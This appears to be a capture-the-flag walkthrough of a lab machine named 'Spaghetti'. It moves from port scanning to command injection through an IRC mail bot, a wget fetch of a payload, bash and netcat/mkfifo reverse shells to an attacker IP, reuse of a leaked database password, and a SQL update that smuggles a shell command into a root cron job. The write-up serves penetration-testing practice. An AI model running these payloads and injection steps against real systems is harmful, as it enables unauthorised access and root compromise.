@@ -1,0 +1,258 @@
+																							                     Spaghetti Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.201.160
+export IP=192.168.201.160
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+6667/tcp open  irc
+8080/tcp open  http-proxy
+
+nmap -Pn -n -sC -sV -p22,25,80,6667,8080 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+25/tcp   open  smtp    Postfix smtpd
+|_smtp-commands: spaghetti.lan, PIPELINING, SIZE 10240000, VRFY
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Spaghetti Mail
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+6667/tcp open  irc
+| irc-info: 
+|   users: 2
+|   servers: 1
+8080/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-title: Postfix Admin - 192.168.214.160:8080
+|_Requested resource was login.php
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: Hosts:  spaghetti.lan, irc.spaghetti.lan; OS: Linux;
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+nmap -n $IP -p 8080 -sV --script vuln --stats-every=5s 
+
+
+nikto --url $IP -p 8080
+
+Port 25
+
+smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
+
+pollinate exists
+tss exists
+
+Port 80
+irc.spaghetti.lan
+mailAssistant
+
+Port 6667
+
+# Connect to IRC
+
+nc -nv $IP 6667
+:irc.spaghetti.lan NOTICE * :*** Looking up your hostname...
+:irc.spaghetti.lan NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.45.5) instead.
+
+# Since the hostname cannot be resolved, let's login manually
+
+nick kali
+user kali * 0 kali
+
+# List channels
+
+list
+:irc.spaghetti.lan 321 kali Channel :Users Name
+:irc.spaghetti.lan 322 kali #mailAssistant 1 :[+nt] 
+:irc.spaghetti.lan 323 kali :End of channel list.
+
+# Since there's only 1 channel available, let's join it
+
+join #mailAssistant
+:kali!kali@192.168.45.5 JOIN :#mailAssistant
+:irc.spaghetti.lan 353 kali = #mailAssistant :@spaghetti_BoT kali
+:irc.spaghetti.lan 366 kali #mailAssistant :End of /NAMES list.
+
+# Let’s send a message to the channel using the privmsg command.
+
+privmsg #mailAssistant hello
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG #mailAssistant :Hello! I'm a spaghetti assistant BoT, please DM me with !command for a list of command.
+
+# Let's view the available commands
+
+privmsg spaghetti_BoT !command
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :Please if you have any problems with your email, use: <email:your_email> <description:problem_description>. You will be contacted as soon as possible and mail will be sent to the administrator. Thank you.
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :**************************************************************************
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :Use: !about , for information.
+
+# Aparently we have an !about function available to us. Let's see if we can get more info about it.
+
+privmsg spaghetti_BoT !about
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :PyBot is developed and maintained by spaghettimail teams.
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :For more info and released versions use link below.
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :https://github.com/9b61f9c243d4e87b2c95aa27b9e9e1db/PyBot
+
+# Accessing the link and reading through the code, we see that irc_bot.py contains an potential vulnerable code which might allow us to execute commands.
+   The cmd variable in the send_message function is constructed using string formatting. An attacker could potentially supply malicious input containing special characters such as ; and | that could be interpreted by the shell and execute unintended commands. This can result in a command injection attack, which is a serious security vulnerability.
+
+def send_message (recipient, subject, body):
+   cmd="echo {} | mail -s '{}' {}".format(body,subject, recipient)
+   process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+   
+# Let's create a bash file that will give us shell.   
+
+nano exploit.sh
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.45.5/4444 0>&1 
+
+# Start a python server from which we will upload our payload
+
+python3 -m http.server
+
+# Upload the bash file to the target
+
+privmsg spaghetti_BoT email:kali@kali.lan description:test | wget 192.168.45.5/exploit.sh
+
+:spaghetti_BoT!spaghetti_@127.0.0.1 PRIVMSG kali :Email sent to administrator. Thank you.
+
+# Now let's run our payload. Have your netcat listener on.
+
+privmsg spaghetti_BoT email:kali@kali.lan description:test | bash exploit.sh
+
+nc -lvnp 4444                                                         # Got shell
+
+cat local.txt                                                            # Flag: 9652643d3ee2a03f4e55d5228dbd61f8
+
+
+Privilege escalation
+
+
+crontab -l
+*/1 * * * * /bin/sh -c /home/hostmaster/monitor.sh
+
+
+# Checking for configuration files
+cat /var/www/postfixadmin/config.local.php 
+
+$CONF['database_type'] = 'mysqli';
+$CONF['database_user'] = 'postfixadmin';
+$CONF['database_password'] = 'P4s8vV0r6';
+$CONF['database_name'] = 'postfixadmin';
+
+# Let's connect to PostgreSQL DB
+mysql -upostfixadmin -pP4s8vV0r6
+
+
+# running pspy64 we notice that root is running some scripts
+
+/opt/check_mailpass_expiration.sh
+
+# This script looks for any passwords that are expiring in the database, and sends an email 30, 14 and 7 days before the expiration. The placeholder ${RESULT[1]} is replaced with the expiration date value in the MySQL database and ${RESULT[0]} is the username.
+
+cat /opt/check_mailpass_expiration.sh
+POSTFIX_DB="postfixadmin"
+MYSQL_CREDENTIALS_FILE="/root/postfixadmin.my.cnf"
+
+REPLY_ADDRESS=noreply@spaghetti.lan
+
+# Change this list to change notification times and when ...
+for INTERVAL in 30 14 7
+do
+    LOWER=$(( $INTERVAL - 1 ))
+
+    QUERY="SELECT username,password_expiry FROM mailbox WHERE password_expiry > now() + interval $LOWER DAY AND password_expiry < NOW() + interval $INTERVAL DAY"
+
+    mysql --defaults-extra-file="$MYSQL_CREDENTIALS_FILE" "$POSTFIX_DB" -B -e "$QUERY" | while read -a RESULT ; do
+        echo -e "Dear User, \n Your password will expire on ${RESULT[1]}" | mail -s "Password 30 days before expiration notication" -r $REPLY_ADDRESS  ${RESULT[0]}
+    done
+
+# We have access to the MySQL server using the credentials we found in the config.local.php config file. We can attempt to inject commands into the username field in the database which will then be queried by the above script and executed by the root user.
+
+# Let’s create a simple reverse shell script in one of the world writable directories.
+
+nano script.sh
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.5 4444 >/tmp/f 
+
+chmod +x script.sh
+
+
+# Let's log in to the DB
+
+mysql -upostfixadmin -pP4s8vV0r6
+show databases;
+use postfixadmin;
+show tables;
+| admin            
+| alias            
+| alias_domain      
+| config          
+| domain            
+| domain_admins       
+| fetchmail          
+| log              
+| mailbox            
+| quota              
+| quota2           
+| vacation           
+| vacation_notification 
+
+# There is the mailbox table that is used in the script that we looked at earlier. Let's list the available fields in this table by using the describe command.
+
++--------------------+-----------------+
+| Field                  | Type              | 
++--------------------+-----------------+
+| username          | varchar(255)  
+| password           | varchar(255)  
+| name                | varchar(255)           
+| maildir               | varchar(255)   
+| quota                 | bigint           
+| local_part           | varchar(255)  
+| domain              | varchar(255)  
+| created              | datetime        
+| modified             | datetime       
+| active                 | tinyint(1)      
+| phone                | varchar(30)     
+| email_other        | varchar(255)  
+| token                 | varchar(255)  
+| token_validity      | datetime       
+| password_expiry  | datetime        
++--------------------+-----------------+
+
+# We will need to inject a system command into the username field and update the password_expiry field to trigger the cron job script to send an email and hopefully execute our command. 
+   Let's list the available users to see what we have to work with.
+
+select username, password_expiry from mailbox;
++--------------------------------+-------------------------+
+| username                         | password_expiry      |
++--------------------------------+-------------------------+
+| giuseppe.verdi@private.lan | 2022-03-09 11:38:00 |
++--------------------------------+-------------------------+
+
+# We have one user account available to us. Let's inject a command to run our script we placed /dev/shm/script.sh. 
+   We will need to supply a username and then escape the string with a pipe (|) like we did before with the IRC bot.
+   
+update mailbox set username=' |/dev/shm/script.sh';
+
+# Start out netcat listener
+
+nc -lvnp 4444   
+
+# Back in our MySQL session on the target system, let's update the password_expiry field to a date 7 days from today. This should trigger the script called by the root cron job to send an email using our modified username.
+
+update mailbox set password_expiry = (select now() + interval 7 day);
+
+# Once the cron job runs again, we should see a connection on our listener.
+
+└─# nc -lvnp 4444  
+listening on [any] 4444 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.201.160] 45986
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/proof.txt                                                      # Flag: bfeb3e4bbad4300d0ef312f603b00c1d
